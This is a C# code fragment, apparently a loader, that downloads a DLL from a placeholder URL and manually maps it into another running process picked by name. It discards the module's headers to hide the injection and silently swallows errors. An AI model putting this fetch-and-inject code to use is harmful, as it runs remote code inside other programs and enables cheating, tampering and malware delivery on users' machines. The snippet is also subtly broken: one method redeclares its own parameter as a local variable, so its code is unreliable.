        static Lunar.LibraryMapper mapper = null;

        static void Main()
        {
            byte[] file = UrlFileToByteArray("your dll.dll");
            Inject.injectLib("ProcessName", file);
        }

        public static void injectLib(string ProcessName, byte[] dllbytes)
        {
            try
            {
                var process = Process.GetProcessesByName(ProcessName)[0];

                var flags = MappingFlags.DiscardHeaders;

                mapper = new LibraryMapper(process, dllbytes, flags);

                mapper.MapLibrary();
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message, Authenticator.MessagesTitle, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public static byte[] UrlFileToByteArray(string file)
        {
            byte[] file = null;
            string urldata = "URL / DLL.dll";

            using (WebClient wc = new WebClient())
            {
                file = wc.DownloadData(urldata + file);
            }

            return file;
        }
